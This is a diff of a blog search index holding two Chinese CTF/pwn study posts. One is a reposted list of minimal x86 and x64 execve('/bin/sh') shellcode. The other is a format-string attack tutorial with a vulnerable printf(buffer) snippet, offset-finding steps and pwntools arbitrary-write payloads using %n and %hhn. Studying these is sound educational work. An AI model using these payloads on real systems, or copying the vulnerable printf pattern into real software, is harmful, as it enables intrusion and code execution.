+    <content><![CDATA[<h2 id="32位"><a class="markdownIt-Anchor" href="#32位"></a> 32位</h2>
+<p>有&quot;\x00&quot;最短 20 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcode= &#x27;&#x27;&#x27;            </span><br><span class="line">xor ecx,ecx               </span><br><span class="line">mul ecx                   </span><br><span class="line">mov al,0xb                </span><br><span class="line">push 0x68732f             </span><br><span class="line">push 0x6e69622f           </span><br><span class="line">mov ebx,esp               </span><br><span class="line">int 0x80                  </span><br><span class="line">&#x27;&#x27;&#x27;                       </span><br><span class="line">shellcode=asm(shellcode)</span><br></pre></td></tr></table></figure>
+<p>无&quot;\x00&quot;最短 21 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">mul ecx</span><br><span class="line">push eax</span><br><span class="line">mov al,0xb</span><br><span class="line">push 0x68732f2f   </span><br><span class="line">push 0x6e69622f   </span><br><span class="line">mov ebx,esp</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+<p>标准shellcode 23 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">push edx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,0xB</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+<h2 id="64位"><a class="markdownIt-Anchor" href="#64位"></a> 64位</h2>
+<p>最短有&quot;\x00&quot; 22 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">mov rbx,0x68732f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>最短无&quot;\x00&quot; 23 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">push rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>标准shellcode 31 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor    rdi,rdi</span><br><span class="line">xor    rsi,rsi</span><br><span class="line">xor    rdx,rdx</span><br><span class="line">xor    rax,rax</span><br><span class="line">push   rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push   rbx</span><br><span class="line">mov    rdi,rsp</span><br><span class="line">mov    al,0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<h3 id="转载自"><a class="markdownIt-Anchor" href="#转载自"></a> 转载自:</h3>
+<p><a href="https://b0ldfrev.gitbook.io/note/pwn/linux_shellcode">Linux_ShellCode</a></p>
+]]></content>
+      <categories>
+        <category>shellcode</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Format-String Attack</title>
+    <url>/2022/03/18/fmtstr_attack/</url>
+    <content><![CDATA[<h2 id="1-漏洞样式"><a class="markdownIt-Anchor" href="#1-漏洞样式"></a> 1. 漏洞样式</h2>
+<p>通常情况下漏洞程序样式：</p>
+<div align=center>Table 1. Vulnerable Code Demo</div>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char buffer[1024];</span><br><span class="line">gets(buffer, 1024);</span><br><span class="line">printf(buffer);</span><br></pre></td></tr></table></figure>
+<p>字符串 <code>buffer</code> 可控且作为 <code>printf</code> 的第一个参数。当其中包含 <code>格式化字符(例如%s, %d, %p等)</code> 时，栈上的内容就会被当做printf的第2个、第3个参数等被输出。</p>
+<h2 id="2-利用方法"><a class="markdownIt-Anchor" href="#2-利用方法"></a> 2. 利用方法</h2>
+<h3 id="21-确定偏移"><a class="markdownIt-Anchor" href="#21-确定偏移"></a> 2.1 确定偏移</h3>
+<p>输入字符串（即Table 1中<code>buffer</code>）在栈上的偏移，即<code>buffer</code>被<code>printf</code>当做参数时，作为第几个参数。参数序号从0开始： printf(arg0, arg1, arg2, …, argn); 第10参数即表示arg10</p>
+<ul>
+<li>步骤1. <code>break printf</code> ；即在 <code>printf</code> 下断点</li>
+<li>步骤2. 输入 <code>%p%p%p%p</code> 等特殊字符</li>
+<li>步骤3. 在  <code>printf</code> 函数断点，使用 <code>stack</code> 命令查看栈。找到 <code>%p%p%p%p</code> 特殊字符串在栈上的位置。如Figure 1所示。<br />
+<img src="https://s2.loli.net/2022/03/18/vqXDrI3Z5m4CHRE.png" alt="" /></li>
+</ul>
+<div align=center>Figure 1. printf stack illustration</div>
+<p>需注意图中①断点在<code>printf</code>入口，已跳转到<code>printf</code> 但尚未执行<code>printf</code>中指令（尤其是栈指令，否则栈布局会改变）；注意图中② <code>0b</code> 即字符串 <code>%p%p%p%p</code> 距离栈顶( <code>esp</code> )的偏移为 <code>11</code>；由于在 <code>esp + 0</code> 的位置存放函数返回地址。因此 <code>%p%p%p%p</code> 字符串实际上位于 <code>栈上</code> 第 <code>10</code> 个参数。</p>
+<ul>
+<li>步骤4. 根据不同架构确定 <code>buffer</code> 在 <code>printf</code> 函数参数的序号。参考<a href="https://www.laruence.com/2008/04/01/116.html"><code>函数调用约定</code></a>。
+<ul>
+<li>a). x86架构<br />
+x86架构的函数参数全部通过栈传递， 因此 <code>buffer</code> 是 <code>printf</code> 的第<code>10</code>个参数。</li>
+<li>b). x64架构<br />
+x64传参顺序为rdi, rsi, rdx, rcx, r8, r9; 之后才使用栈传参。因此若 <code>Figure 1</code> 在x64架构中，<code>buffer</code>对应的是<code>printf</code>函数的第（0xb + 6 - 1)= 16 个参数(参数序号从0开始，0，1，2，…, 16)。</li>
+</ul>
+</li>
+</ul>
+<h3 id="22-实现任意地址写"><a class="markdownIt-Anchor" href="#22-实现任意地址写"></a> 2.2 实现任意地址写</h3>
+<p>往 <code>任意目标地址(记为target_address)</code> 中写入 <code>任意值(记为target_value)</code> 。</p>
+<ul>
+<li>1). 任意值的控制：通过格式化字符串 <code>%Mc</code> 其中 <code>M=target_value</code>来操控</li>
+<li>2). 任意地址的控制：将目标地址(<code>target_address</code>)写入<code>buffer</code>字符串中；并通过格式化字符串 <code>%N$n</code>来指定将 <code>*当前printf已经输字符个数</code>* 写入到第 <code>N</code> 个参数指定的地址中。其中 <code>N</code>即为’使用<code>2.1</code>中方法确定的‘’在<code>buffer</code>字符串中的‘’<code>target_address</code>在栈上的位置对应的<code>printf</code>的参数序号‘。(该处使用’'分句停顿帮助阅读)</li>
+</ul>
+<p>例如：</p>
+<h4 id="221-当target_value-较小时直接写入"><a class="markdownIt-Anchor" href="#221-当target_value-较小时直接写入"></a> 2.2.1 当<code>target_value</code> 较小时，直接写入</h4>
+<p>假如buffer字符串位于printf第10个参数的位置(即arg10、即printf栈0xb(10+1)参数位）</p>
+<div align=center>Table 2. Payload Demo 1</div>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 写4到target_address</span><br><span class="line">payload1 = p32(target_address) + b&#x27;%10$n\0&#x27;</span><br></pre></td></tr></table></figure>
+<p>其中：<br />
+payload1实现写4(p32为4byte)到target_address</p>
+<div align=center>Table 3. Payload Demo 2</div>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload2 = b&#x27;%100c&#x27; + b&#x27;%13$n&#x27;</span><br><span class="line">payload2 = payload2.ljust(12, b&#x27;a&#x27;)</span><br><span class="line">payload2 += p32(target_address)</span><br></pre></td></tr></table></figure>
+<p>payload2实现写100到target_address, 此处由于target_adress没有写在字符串的开头，因此需要重新计算在栈上的偏移：字符串开头位于arg10处，字符串中target_address之前有12个字符即占3个参数位，因此target_address对应的参数位为13</p>
+<h4 id="222-当target_value太大时分字节写入"><a class="markdownIt-Anchor" href="#222-当target_value太大时分字节写入"></a> 2.2.2 当target_value太大时，分字节写入</h4>
+<p>假如buffer字符串位于printf第10个参数的位置(即arg10、即printf栈0xb(10+1)参数位）；且需要向<code>target_address</code> 中写入的<code>target_value</code>为<code>*0xbaedbeef</code>*。</p>
+<pre><code>实际上就是令：
+*(int8*)target_address = 0xef = 239
+*(int8*)(target_address + 1) = 0xbe = 190
+*(int8*)(target_address + 2) = 0xed = 237
+*(int8*)(target_address + 3) = 0xba = 186
+</code></pre>
+<p>这种情况下使用 <code>%N$hhn</code> 向目标地址写入<code>int8</code>宽度值 和 使用 <code>%N$hn</code> 向目标地址写入<code>int16</code>宽度值，将会非常有用。</p>
+<p>那么可以使用如下payload实现：</p>
+<div align=center>Table 4. Payload Demo 3</div>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p32(target_address)          //arg10</span><br><span class="line">payload += p32(target_address + 1)     //arg11</span><br><span class="line">payload += p32(target_address + 2)     //arg12</span><br><span class="line">payload += p32(target_address + 3)     //arg13</span><br><span class="line">//已有16byte输出；写入时从小到大写；即186-&gt;190-&gt;237-&gt;239</span><br><span class="line">// 186 - 16 = 170</span><br><span class="line">payload += b&quot;%170c%13$hhn&quot;</span><br><span class="line">// 190 - 186 = 4</span><br><span class="line">payload += b&quot;%4c%11$hhn&quot;</span><br><span class="line">// 237 - 190 = 47</span><br><span class="line">payload += b&quot;%47c%12$hhn&quot;</span><br><span class="line">// 239 - 237 = 2</span><br><span class="line">payload += b&quot;%2c%10$hhn&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="223-使用pwnlib的fmtstr_payload函数自动构造payload"><a class="markdownIt-Anchor" href="#223-使用pwnlib的fmtstr_payload函数自动构造payload"></a> 2.2.3 使用<code>pwnlib</code>的<code>fmtstr_payload</code>函数自动构造payload</h4>
+<p>示例如下：</p>
+<div align=center>Table 5. Payload Demo 4: fmtstr_payload</div>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from pwnlib.util import misc</span><br><span class="line">//payload = fmtstr_payload(10, &#123;0x804c044: 0x1&#125;)</span><br><span class="line">payload = fmtstr_payload(10, &#123;target_address: target_value&#125;)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>
+<h2 id="2-注意事项"><a class="markdownIt-Anchor" href="#2-注意事项"></a> 2. 注意事项</h2>
+<h2 id="3-原理说明"><a class="markdownIt-Anchor" href="#3-原理说明"></a> 3. 原理说明</h2>
+<p>参考：<br />
+<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">fmtstr_attack on ctf-wiki</a></p>
+]]></content>
+      <categories>
+        <category>Format String</category>
+      </categories>
+      <tags>
+        <tag>Format String</tag>
       </tags>
   </entry>
 </search>
